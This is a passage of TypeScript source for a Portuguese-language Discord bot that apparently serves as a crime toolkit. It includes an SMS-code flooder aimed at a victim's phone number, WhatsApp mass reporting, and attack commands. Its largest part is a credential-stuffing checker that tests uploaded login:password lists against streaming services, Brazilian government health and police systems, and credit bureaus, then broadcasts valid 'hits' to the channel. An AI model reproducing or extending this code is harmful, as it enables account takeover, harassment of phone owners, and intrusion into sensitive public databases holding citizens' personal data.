          { name: "✅ Enviados", value: `\`${sent}/${result.requested ?? quantidade}\``,                       inline: true },
          { name: "❌ Falhos",   value: `\`${result.failed ?? quantidade}\``,                                  inline: true },
        )
        .setFooter({ text: `${AUTHOR} • WhatsApp Report` })
        .setTimestamp();

      if (result.errors?.length) {
        embed.addFields({ name: "⚠️ Erros", value: `\`\`\`${result.errors.slice(0, 5).join("\n")}\`\`\`` });
      }
      if (result.error) {
        embed.addFields({ name: "❌ Erro", value: `\`${result.error.slice(0, 200)}\`` });
      }

      // ── Histórico resumido ──────────────────────────────────────────────────
      const hist = (waHistory.get(uid) ?? []).slice(-5).reverse();
      if (hist.length > 1) {
        const histLines = hist.map(h => {
          const t = new Date(h.at).toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
          return `${h.type === "report" ? "🚩" : "📲"} \`${h.number}\` — ${h.sent}/${h.total} — ${t}`;
        }).join("\n");
        embed.addFields({ name: "📜 Histórico recente", value: histLines.slice(0, 512) });
      }

      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (sub === "codigo") {
      const numero = interaction.options.getString("numero", true).trim();

      // ── Cooldown check ─────────────────────────────────────────────────────
      const wait = checkWaCooldown(waSendcodeCooldowns, uid, WA_SENDCODE_COOLDOWN_MS);
      if (wait > 0) {
        const sec = Math.ceil(wait / 1000);
        const cdEmbed = new EmbedBuilder()
          .setColor(COLORS.CRIMSON)
          .setTitle("⏳ Cooldown Ativo")
          .setDescription(`Aguarde **${sec}s** antes de disparar outro código.`)
          .setFooter({ text: AUTHOR });
        await interaction.reply({ embeds: [cdEmbed], flags: MessageFlags.Ephemeral });
        return;
      }

      await interaction.deferReply();
      waSendcodeCooldowns.set(uid, Date.now());

      const loadEmbed = new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle("📲 Disparo de Código SMS")
        .setDescription(`Disparando códigos de verificação para \`${numero}\`…\n🎯 22 serviços: Telegram, iFood, Rappi, PicPay, ML, Shopee, TikTok, Nubank, ZeDelivery, 99Food, Kwai, InDrive, Signal, Uber, OLX, Binance, Amazon, Nubank Pix, PicPay Pix, RecargaPay, Mercado Pago, Kwai BR`)
        .setFooter({ text: AUTHOR });
      await interaction.editReply({ embeds: [loadEmbed] });

      type SvcResult = { service: string; status: "sent" | "failed"; detail?: string };
      let result: { number?: string; sent?: number; failed?: number; total?: number; services?: SvcResult[]; error?: string } = {};
      try {
        const resp = await fetch(`${API_BASE}/api/whatsapp/sendcode`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ number: numero, userId: uid }),
          signal: AbortSignal.timeout(60_000),
        });
        result = await resp.json() as typeof result;
      } catch (e) {
        result = { error: String(e) };
      }

      const sentCount = result.sent ?? 0;
      addWaHistoryDiscord(uid, { type: "sendcode", number: result.number ?? numero, sent: sentCount, total: result.total ?? 0, at: Date.now() });

      const embed = new EmbedBuilder()
        .setColor(sentCount > 0 ? COLORS.GOLD : COLORS.CRIMSON)
        .setTitle("📲 Disparo de Código — Resultado")
        .addFields(
          { name: "📱 Número",   value: `\`${result.number ?? numero}\``,        inline: true },
          { name: "✅ Enviados", value: `\`${sentCount}/${result.total ?? 0}\``,  inline: true },
          { name: "❌ Falhos",   value: `\`${result.failed ?? 0}\``,              inline: true },
        )
        .setFooter({ text: `${AUTHOR} • SMS Code Blaster` })
        .setTimestamp();

      if (result.services?.length) {
        const lines = result.services.map(s =>
          `${s.status === "sent" ? "✅" : "❌"} **${s.service}**${s.detail ? ` — \`${s.detail}\`` : ""}`
        ).join("\n");
        embed.addFields({ name: "📋 Serviços", value: lines.slice(0, 1024) });
      }
      if (result.error) {
        embed.addFields({ name: "❌ Erro", value: `\`${result.error.slice(0, 200)}\`` });
      }

      await interaction.editReply({ embeds: [embed] });
    }
  }

  client.on(Events.InteractionCreate, async interaction => {
    try {
      if (interaction.isStringSelectMenu()) {
        await handleSelectMenu(interaction as StringSelectMenuInteraction);
        return;
      }

      if (interaction.isButton()) {
        await handleButton(interaction as import("discord.js").ButtonInteraction);
        return;
      }

      if (!interaction.isChatInputCommand()) return;

      // ── Universal command log (non-blocking) ──────────────────────────────
      void logCommandUsage(interaction);

      const { commandName } = interaction;

      if (commandName === "attack") {
        const sub = interaction.options.getSubcommand();
        if (sub === "start")      await handleAttackStart(interaction);
        else if (sub === "stop")  await handleAttackStop(interaction);
        else if (sub === "list")  await handleAttackList(interaction);
        else if (sub === "stats") await handleAttackStats(interaction);
      } else if (commandName === "analyze") {
        await handleAnalyze(interaction);
      } else if (commandName === "methods") {
        await handleMethods(interaction);
      } else if (commandName === "info") {
        await handleInfo(interaction);
      } else if (commandName === "help") {
        await handleHelp(interaction);
      } else if (commandName === "cluster") {
        await handleCluster(interaction);
      } else if (commandName === "check") {
        await handleCheck(interaction);
      } else if (commandName === "geass") {
        await handleGeass(interaction);
      } else if (commandName === "hydra") {
        await handleHydra(interaction);
      } else if (commandName === "schedule") {
        await handleSchedule(interaction);
      } else if (commandName === "advisor") {
        await handleAdvisor(interaction);
      } else if (commandName === "proxy") {
        await handleProxy(interaction);
      } else if (commandName === "vip") {
        await handleVip(interaction);
      } else if (commandName === "stats") {
        await handleStats(interaction);
      } else if (commandName === "admin") {
        await handleAdmin(interaction);
      } else if (commandName === "whois") {
        await handleWhois(interaction);
      } else if (commandName === "panel") {
        await handlePanel(interaction);
      } else if (commandName === "admins") {
        await handleAdmins(interaction);
      } else if (commandName === "checker") {
        await handleChecker(interaction);
      } else if (commandName === "cpf") {
        await handleCpf(interaction);
      } else if (commandName === "consulta") {
        await handleConsulta(interaction);
      } else if (commandName === "osint") {
        await handleOsint(interaction);
      } else if (commandName === "url") {
        await handleUrl(interaction);
      } else if (commandName === "voice") {
        await handleVoice(interaction);
      } else if (commandName === "nitro") {
        await handleNitro(interaction);
      } else if (commandName === "sky") {
        await handleSky(interaction);
      } else if (commandName === "historico") {
        await handleHistorico(interaction);
      } else if (commandName === "reportwa") {
        await handleWhatsapp(interaction);
      } else if (commandName === "reportredes") {
        await handleReportRedes(interaction);
      }
    } catch (err) {
      console.error("[INTERACTION ERROR]", err);
      try {
        const errEmbed = buildErrorEmbed("INTERNAL ERROR", "An unexpected error occurred. Please try again.");
        if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
          await interaction.reply({ embeds: [errEmbed], flags: MessageFlags.Ephemeral });
        }
      } catch { /**/ }
    }
  });

  // ── New member alert — scans risk and alerts mod log channel ─────────────
  // Note: guildMemberAdd fires for all joins only when GuildMembers privileged
  // intent is enabled in the Developer Portal + uncommented in the intents above.
  // Without it, this still fires for the bot's own join events.
  client.on(Events.GuildMemberAdd, async (member) => {
    try {
      const channelId = getLogChannelId(member.guild.id);
      if (!channelId) return;

      const fetched = await member.user.fetch(true).catch(() => member.user);
      const sf = (() => {
        const DISCORD_EPOCH = 1420070400000n;
        const bigId = BigInt(fetched.id);
        return { timestamp: Number((bigId >> 22n) + DISCORD_EPOCH) };
      })();
      const accountAgeDays = Math.floor((Date.now() - sf.timestamp) / 86_400_000);
      const createdTs = Math.floor(sf.timestamp / 1000);

      // Quick risk score
      let riskScore = 0;
      const riskFactors: string[] = [];
      if (accountAgeDays < 3)   { riskScore += 50; riskFactors.push("⚠️ Conta com menos de 3 dias"); }
      else if (accountAgeDays < 7)  { riskScore += 35; riskFactors.push("⚠️ Conta com menos de 7 dias"); }
      else if (accountAgeDays < 30) { riskScore += 20; riskFactors.push("⚠️ Conta com menos de 30 dias"); }
      if (!fetched.avatar)  { riskScore += 10; riskFactors.push("📷 Avatar padrão (nunca customizou)"); }
      const digitRatio = (fetched.username.match(/\d/g)?.length ?? 0) / fetched.username.length;
      if (digitRatio > 0.5) { riskScore += 15; riskFactors.push("🔢 Username com muitos números"); }
      if (/^[a-z]{2,5}\d{4,}$/i.test(fetched.username)) { riskScore += 10; riskFactors.push("🤖 Padrão de username de bot/alt"); }

      const riskLevel = riskScore >= 60 ? "🔴 CRÍTICO" : riskScore >= 40 ? "🟠 ALTO" : riskScore >= 20 ? "🟡 MÉDIO" : "🟢 BAIXO";
      const embedColor = riskScore >= 60 ? 0xFF0000 : riskScore >= 40 ? 0xFF8800 : riskScore >= 20 ? 0xFFDD00 : 0x00CC00;

      // Only alert if risk is medium or above
      if (riskScore < 20) return;

      const embed = new EmbedBuilder()
        .setColor(embedColor)
        .setTitle(`🚨 NOVO MEMBRO — ALERTA DE RISCO ${riskLevel}`)
        .setThumbnail(fetched.displayAvatarURL({ size: 256 }))
        .setDescription(
          riskScore >= 60
            ? `*"Hydra detectou uma ameaça potencial entrando no reino. Atenção máxima, soldados."*`
            : `*"Um novo súdito chegou. Hydra identifica pontos de atenção a monitorar."*`
        )
        .addFields(
          { name: "👤 Usuário",        value: `${fetched.username} (<@${fetched.id}>)`,              inline: true  },
          { name: "🪪 ID",             value: `\`${fetched.id}\``,                                    inline: true  },
          { name: "📅 Conta criada",   value: `<t:${createdTs}:R> (\`${accountAgeDays}d\` atrás)`,   inline: false },
          {
            name: `⚠️ FATORES DE RISCO (score: ${riskScore}/100)`,
            value: riskFactors.join("\n") || "Nenhum fator detectado",
            inline: false,
          },
        )
        .setFooter({ text: `${AUTHOR} • Use /whois para dossier completo` })
        .setTimestamp();

      const ch = await botClient!.channels.fetch(channelId);
      if (ch && ch.isTextBased() && "send" in ch) {
        await (ch as import("discord.js").TextChannel).send({ embeds: [embed] });
      }

      console.log(`[NEW MEMBER] ${fetched.username} (${fetched.id}) joined ${member.guild.name} — risk score: ${riskScore} (${riskLevel})`);
    } catch (e) {
      console.warn("[MEMBER JOIN ALERT]", e instanceof Error ? e.message : e);
    }
  });

  // ── .txt file drop → checker auto-trigger ────────────────────────────────
  // When an authorized user drops a .txt file in any channel the bot can see,
  // automatically parse credentials and show the checker target selector.
  client.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;
    if (!isOwner(message.author.id, message.author.username) && !isMod(message.author.id, message.author.username)) return;

    // Only trigger when message has a .txt attachment (and optionally nothing else, or a brief label)
    const txtAtt = message.attachments.find(a => a.name.endsWith(".txt") || a.contentType?.includes("text/plain"));
    if (!txtAtt) return;

    // Prevent triggering on huge files
    if ((txtAtt.size ?? 0) > 1_024_000) {
      await message.reply({ content: "⚠️ Arquivo muito grande para o checker (limite: 1 MB)." }).catch(() => void 0);
      return;
    }

    // Download + parse credentials
    let credentials: string[] = [];
    try {
      const text = await fetch(txtAtt.url).then(r => r.text());
      credentials = text
        .split(/\r?\n/)
        .map(s => s.trim())
        .filter(s => s.includes(":") && !s.startsWith("#"))
        ; // no credential limit for file drops — runs until all are tested
    } catch {
      await message.reply({ content: "❌ Não consegui baixar o arquivo. Tente novamente." }).catch(() => void 0);
      return;
    }

    if (credentials.length === 0) {
      await message.reply({ content: "⚠️ Nenhuma credencial válida encontrada no arquivo.\n> Formato esperado: `login:senha` (uma por linha)." }).catch(() => void 0);
      return;
    }

    // ── Step 1: Categoria (Streaming vs Logins) ───────────────────────────────
    const fdCatRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId("chk_cat_streaming").setLabel("🎬 Streaming").setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId("chk_cat_logins").setLabel("🔑 Logins").setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
    );

    let reply: import("discord.js").Message;
    try {
      reply = await message.reply({
        embeds: [new EmbedBuilder()
          .setColor(0xF1C40F)
          .setTitle("🎯 CHECKER — SELECIONE A CATEGORIA")
          .setDescription(
            `📄 **${txtAtt.name}** — **${credentials.length}** credencial${credentials.length === 1 ? "" : "is"} detectada${credentials.length === 1 ? "" : "s"}.\n\n` +
            `Escolha o tipo de sistema:`,
          )
          .addFields(
            { name: "🎬 Streaming", value: "Crunchyroll · Netflix · Amazon Prime\nHBO Max · Disney+ · Paramount+", inline: true },
            { name: "🔑 Logins",    value: "iSeek · DataSUS · SIPNI · ConsultCenter\nMind-7 · SERPRO · SISREG · CrediLink\nSerasa · SINESP · Serasa Exp. · Instagram\nSISP-ES · SIGMA", inline: true },
          )
          .setFooter({ text: `${AUTHOR} • Expira em 60s` })],
        components: [fdCatRow],
      });
    } catch {
      return;
    }

    // ── Await categoria ────────────────────────────────────────────────────────
    let fdCatInteraction: import("discord.js").ButtonInteraction;
    try {
      fdCatInteraction = await reply.awaitMessageComponent({
        componentType: ComponentType.Button,
        filter: (b) => b.user.id === message.author.id && b.customId.startsWith("chk_"),
        time: 60_000,
      });
    } catch {
      await reply.edit({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhuma categoria selecionada em 60s.")], components: [] }).catch(() => void 0);
      return;
    }

    if (fdCatInteraction.customId === "chk_cancel") {
      await fdCatInteraction.update({ embeds: [buildErrorEmbed("CANCELADO", "Checker cancelado.")], components: [] });
      return;
    }

    // ── Step 2: Alvos da categoria escolhida ──────────────────────────────────
    const fdIsStreaming = fdCatInteraction.customId === "chk_cat_streaming";
    const fdSubRows: ActionRowBuilder<ButtonBuilder>[] = fdIsStreaming
      ? [
          new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder().setCustomId("chk_crunchyroll").setLabel("🍥 Crunchyroll").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_netflix").setLabel("🎬 Netflix").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_amazon").setLabel("📦 Amazon Prime").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_hbomax").setLabel("👑 HBO Max").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_disney").setLabel("🏰 Disney+").setStyle(ButtonStyle.Secondary),
          ),
          new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder().setCustomId("chk_paramount").setLabel("⭐ Paramount+").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
          ),
        ]
      : [
          new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder().setCustomId("chk_iseek").setLabel("🌐 iSeek").setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId("chk_datasus").setLabel("🏥 DataSUS").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_sipni").setLabel("💉 SIPNI v2").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_consultcenter").setLabel("📋 ConsultCenter").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_mind7").setLabel("🧠 Mind-7").setStyle(ButtonStyle.Secondary),
          ),
          new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder().setCustomId("chk_serpro").setLabel("🛡️ SERPRO").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_sisreg").setLabel("🏨 SISREG III").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_credilink").setLabel("💳 CrediLink").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_serasa").setLabel("📊 Serasa").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_sinesp").setLabel("🚔 SINESP").setStyle(ButtonStyle.Secondary),
          ),
          new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder().setCustomId("chk_serasa_exp").setLabel("💼 Serasa Exp.").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_instagram").setLabel("📸 Instagram").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_sispes").setLabel("🏛️ SISP-ES").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_sigma").setLabel("🔵 SIGMA").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
          ),
        ];

    const fdSubFields: { name: string; value: string; inline: boolean }[] = fdIsStreaming
      ? [
          { name: "🍥 Crunchyroll",  value: "auth.crunchyroll.com — OAuth2 Android", inline: true },
          { name: "🎬 Netflix",      value: "shakti API — BUILD_ID + login",           inline: true },
          { name: "📦 Amazon Prime", value: "amazon.com.br — form scrape",             inline: true },
          { name: "👑 HBO Max",      value: "api.max.com — OAuth2 (Max)",              inline: true },
          { name: "🏰 Disney+",      value: "BAMTech device API — 3-step JWT",         inline: true },
          { name: "⭐ Paramount+",   value: "paramountplus.com — Android REST",        inline: true },
        ]
      : [
          { name: "🌐 iSeek.pro",     value: "iSeek — CSRF + redirect",               inline: true },
          { name: "🏥 DataSUS",       value: "SI-PNI — JSF + SHA-512",                inline: true },
          { name: "💉 SIPNI v2",      value: "SI-PNI — AJAX 4-step (95%)",            inline: true },
          { name: "📋 ConsultCenter", value: "CakePHP login form",                    inline: true },
          { name: "🧠 Mind-7",        value: "mind-7.org + Cloudflare bypass",         inline: true },
          { name: "🛡️ SERPRO",       value: "radar.serpro.gov.br — API Android",      inline: true },
          { name: "🏨 SISREG III",    value: "sisregiii.saude.gov.br — SHA-256",      inline: true },
          { name: "💳 CrediLink",     value: "Credicorp Azure API — JSON token",       inline: true },
          { name: "📊 Serasa",        value: "serasaempreendedor.com.br — curl",      inline: true },
          { name: "🚔 SINESP",        value: "Segurança Pública — OAuth2 Android",    inline: true },
          { name: "💼 Serasa Exp.",   value: "Experience — curl login API",            inline: true },
          { name: "📸 Instagram",     value: "Meta Basic Display API",                 inline: true },
          { name: "🏛️ SISP-ES",      value: "Portal ES — JSF + curl",                inline: true },
          { name: "🔵 SIGMA",         value: "PC-MA — curl form login",               inline: true },
        ];

    await fdCatInteraction.update({
      embeds: [new EmbedBuilder()
        .setColor(fdIsStreaming ? 0x9B59B6 : 0x3498DB)
        .setTitle(fdIsStreaming ? "🎬 STREAMING — SELECIONE O ALVO" : "🔑 LOGINS — SELECIONE O ALVO")
        .setDescription(`**${credentials.length}** credencial${credentials.length === 1 ? "" : "is"} — escolha o alvo:`)
        .addFields(fdSubFields)
        .setFooter({ text: `${AUTHOR} • Expira em 60s` })],
      components: fdSubRows,
    });

    // ── Await alvo específico ─────────────────────────────────────────────────
    let btn: import("discord.js").ButtonInteraction;
    try {
      btn = await reply.awaitMessageComponent({
        componentType: ComponentType.Button,
        filter: (b) => b.user.id === message.author.id && b.customId.startsWith("chk_"),
        time: 60_000,
      });
    } catch {
      await reply.edit({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhum alvo selecionado em 60s.")], components: [] }).catch(() => void 0);
      return;
    }

    if (btn.customId === "chk_cancel") {
      await btn.update({ embeds: [buildErrorEmbed("CANCELADO", "Checker cancelado.")], components: [] });
      return;
    }

    type FdTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma";
    const fdTargetMap: Record<string, FdTarget> = {
      chk_iseek: "iseek", chk_datasus: "datasus", chk_sipni: "sipni",
      chk_consultcenter: "consultcenter", chk_mind7: "mind7",
      chk_serpro: "serpro", chk_sisreg: "sisreg", chk_credilink: "credilink", chk_serasa: "serasa",
      chk_crunchyroll: "crunchyroll", chk_netflix: "netflix", chk_amazon: "amazon",
      chk_hbomax: "hbomax", chk_disney: "disney", chk_paramount: "paramount",
      chk_sinesp: "sinesp", chk_serasa_exp: "serasa_exp", chk_instagram: "instagram",
      chk_sispes: "sispes", chk_sigma: "sigma",
    };
    const target      = fdTargetMap[btn.customId] ?? "iseek";
    const targetLabel = {
      iseek: "iSeek.pro", datasus: "DataSUS / SI-PNI", sipni: "SIPNI v2",
      consultcenter: "ConsultCenter", mind7: "Mind-7",
      serpro: "SERPRO", sisreg: "SISREG III", credilink: "CrediLink", serasa: "Serasa",
      crunchyroll: "Crunchyroll", netflix: "Netflix", amazon: "Amazon Prime",
      hbomax: "HBO Max", disney: "Disney+", paramount: "Paramount+",
      sinesp: "SINESP Segurança", serasa_exp: "Serasa Experience",
      instagram: "Instagram", sispes: "SISP-ES", sigma: "SIGMA (PC-MA)",
    }[target]!;
    const targetIcon  = {
      iseek: "🌐", datasus: "🏥", sipni: "💉",
      consultcenter: "📋", mind7: "🧠",
      serpro: "🛡️", sisreg: "🏨", credilink: "💳", serasa: "📊",
      crunchyroll: "🍥", netflix: "🎬", amazon: "📦",
      hbomax: "👑", disney: "🏰", paramount: "⭐",
      sinesp: "🚔", serasa_exp: "💼", instagram: "📸", sispes: "🏛️", sigma: "🔵",
    }[target]!;
    const concurrency = {
      iseek: 2, datasus: 2, sipni: 2, consultcenter: 3, mind7: 3,
      serpro: 4, sisreg: 2, credilink: 4, serasa: 2,
      crunchyroll: 4, netflix: 2, amazon: 2, hbomax: 4, disney: 3, paramount: 4,
      sinesp: 3, serasa_exp: 3, instagram: 2, sispes: 2, sigma: 3,
    }[target] ?? 2;

    // ── Stop button setup ─────────────────────────────────────────────────────
    const fdStopId  = `chk_stop_${Date.now()}`;
    const fdStopAC  = new AbortController();
    const fdStopRow = new ActionRowBuilder<MessageActionRowComponentBuilder>().addComponents(
      new ButtonBuilder()
        .setCustomId(fdStopId)
        .setLabel("🛑 Parar")
        .setStyle(ButtonStyle.Danger),
    );

    // ── Acknowledge + show initial progress embed ─────────────────────────────
    await btn.update({
      embeds: [new EmbedBuilder()
        .setColor(0xF1C40F)
        .setTitle(`${targetIcon} CHECKER AO VIVO — ${targetLabel}`)
        .setDescription(
          `${buildProgressBar(0, credentials.length)}\n\`0/${credentials.length}\` concluídas\n\n` +
          `✅ **0** HIT  |  ❌ **0** FAIL  |  ⚠️ **0** ERRO\n` +
          `⏱ **0s**  •  🔀 **${concurrency}x paralelo**\n\n` +
          `**Últimos resultados:**\n*Aguardando primeiros resultados...*`,
        )
        .setFooter({ text: `${AUTHOR} • ${targetLabel} • ● Processando...` })],
      components: [fdStopRow],
    });

    // ── Register stop button collector ────────────────────────────────────────
    // 24h collector — message.edit() never expires, checker can run as long as needed
    const fdStopCollector = reply.createMessageComponentCollector({
      componentType: ComponentType.Button,
      filter: (b) => b.customId === fdStopId,
      time: 24 * 60 * 60_000,
      max: 1,
    });

    fdStopCollector.on("collect", async (stopBtn) => {
      fdStopAC.abort("user_stop");
      await stopBtn.deferUpdate().catch(() => void 0);
    });

    // ── Live streaming with animated embed ────────────────────────────────────
    let fdLiveState: LiveCheckerState | null = null;
    let fdEmbedDirty = false;

    const fdUpdateInterval = setInterval(async () => {
      if (!fdLiveState || !fdEmbedDirty) return;
      fdEmbedDirty = false;
      const liveEmbed  = buildLiveCheckerEmbed(fdLiveState, targetLabel, targetIcon, concurrency);
      const components = fdLiveState.done || fdLiveState.stopped ? [] : [fdStopRow];
      await reply.edit({ embeds: [liveEmbed], components }).catch(() => void 0);
    }, 2000);

    let fdFinalState: LiveCheckerState;
    try {
      fdFinalState = await runStreamingChecker(credentials, target, (state) => {
        fdLiveState  = state;
        fdEmbedDirty = true;

        const lastResult = state.allResults[state.allResults.length - 1];
        if (
          lastResult?.status === "HIT" &&
          lastResult.detail?.includes("/dashboard") &&
          !lastResult.detail?.toLowerCase().includes("expired")
        ) {
          message.channel.send({
            content: `@everyone 🚨 **LOGIN ATIVO!** \`${lastResult.credential}\` — ${lastResult.detail}`,
            allowedMentions: { parse: ["everyone"] },
          }).catch(() => void 0);
        }
      }, fdStopAC);
    } catch (err) {
      clearInterval(fdUpdateInterval);
      fdStopCollector.stop();
      await reply.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha no streaming:\n\`${String(err)}\``)], components: [] }).catch(() => void 0);
      return;
    }

    clearInterval(fdUpdateInterval);
    fdStopCollector.stop();

    // ── Stopped early by user (only skip TXT when user explicitly clicked Stop) ─
    if (fdFinalState.userStopped) {
      const stoppedEmbed = buildLiveCheckerEmbed(fdFinalState, targetLabel, targetIcon, concurrency);
      await reply.edit({ embeds: [stoppedEmbed], components: [] }).catch(() => void 0);
      return;
    }

    // ── Final results — summary embed + .txt attachment ──────────────────────
    const fdSummaryEmbed = buildCheckerSummaryEmbed(fdFinalState, targetLabel, targetIcon, concurrency);
    const fdTxtBuf       = buildCheckerTxt(fdFinalState.allResults, fdFinalState, targetLabel, targetIcon, concurrency);
    const fdTs           = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
    const fdFileName     = `checker_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${fdTs}.txt`;
    const fdAttachment   = new AttachmentBuilder(fdTxtBuf, { name: fdFileName });
    await reply.edit({ embeds: [fdSummaryEmbed], files: [fdAttachment], components: [] }).catch(() => void 0);

    // ── Send hits-only .txt to channel (public) ───────────────────────────────
    const fdHits = fdFinalState.allResults.filter(r => r.status === "HIT");
    if (fdHits.length > 0) {
      const fdHitLines: string[] = [
        `✅ HITS — ${targetIcon} ${targetLabel}`,
        `${"─".repeat(50)}`,
        "",
        ...fdHits.map((r, i) => `[${String(i + 1).padStart(2, "0")}]  ${r.credential}\n      └─ ${r.detail ?? "—"}`),
        "",
        `${"─".repeat(50)}`,
        `${fdHits.length} hit(s) de ${fdFinalState.total} testada(s)  •  ${AUTHOR}`,
      ];
      const fdHitsBuf  = Buffer.from(fdHitLines.join("\n"), "utf-8");
      const fdHitsFile = `hits_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${fdTs}.txt`;
      await message.channel.send({ content: `@everyone 🎯 **${fdHits.length} HIT(S)** encontrado(s) — ${targetIcon} ${targetLabel}`, files: [new AttachmentBuilder(fdHitsBuf, { name: fdHitsFile })], allowedMentions: { parse: ["everyone"] } }).catch(() => void 0);
    }
  });

  client.on(Events.Error, err => {
    console.error("[CLIENT ERROR]", err);
  });

  // Gateway connection lifecycle — helps diagnose "bot stopped responding" issues
  client.on(Events.ShardDisconnect, (closeEvent, shardId) => {
    console.warn(`[SHARD ${shardId}] Disconnected — code ${closeEvent.code}. Auto-reconnecting...`);
  });
  client.on(Events.ShardReconnecting, (shardId) => {
    console.log(`[SHARD ${shardId}] Reconnecting to Discord gateway...`);
  });
  client.on(Events.ShardResume, (shardId, replayedEvents) => {
    console.log(`[SHARD ${shardId}] Resumed — replayed ${replayedEvents} events. Bot is back online.`);
  });

  await client.login(BOT_TOKEN);
}

// ── Internal HTTP server — exposes askSkynet() to other local services ────────
// The API server (port 8080) calls POST http://localhost:8089/ask so that
// Telegram bot requests benefit from the full proxy + CF clearance pipeline.
(function startInternalServer() {
  const PORT = 8089;
  const server = http.createServer(async (req, res) => {
    if (req.method !== "POST" || req.url !== "/ask") {
      res.writeHead(404).end(JSON.stringify({ error: "not_found" }));
      return;
    }
    let body = "";
    req.on("data", (c: Buffer) => { body += c.toString(); });
    req.on("end", async () => {
      try {
        const { message, model } = JSON.parse(body) as { message?: string; model?: string };
        if (!message?.trim()) {
          res.writeHead(400, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ error: "message required" }));
          return;
        }
        const endpoint = (model ?? "chat-V3") as Parameters<typeof askSkynet>[1];
        const reply = await askSkynet([{ role: "user", content: message.trim() }], endpoint);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ reply: reply ?? "" }));
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        const status = e instanceof SkynetRateLimitError ? 429 : 502;
        res.writeHead(status, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: msg }));
      }
    });
  });
  server.listen(PORT, "127.0.0.1", () => {
    console.log(`[INTERNAL] SkynetChat proxy listening on 127.0.0.1:${PORT}`);
  });
  server.on("error", (e) => console.error("[INTERNAL] Server error:", e));
})();

// ── Global safety net — prevent silent crashes from unhandled async errors ────
process.on("unhandledRejection", (reason) => {
  console.error("[UNHANDLED REJECTION — bot kept alive]", reason);
});
process.on("uncaughtException", (err) => {
  console.error("[UNCAUGHT EXCEPTION — bot kept alive]", err);
});

main().catch(err => {
  console.error("Fatal error:", err);
  process.exit(1);
});
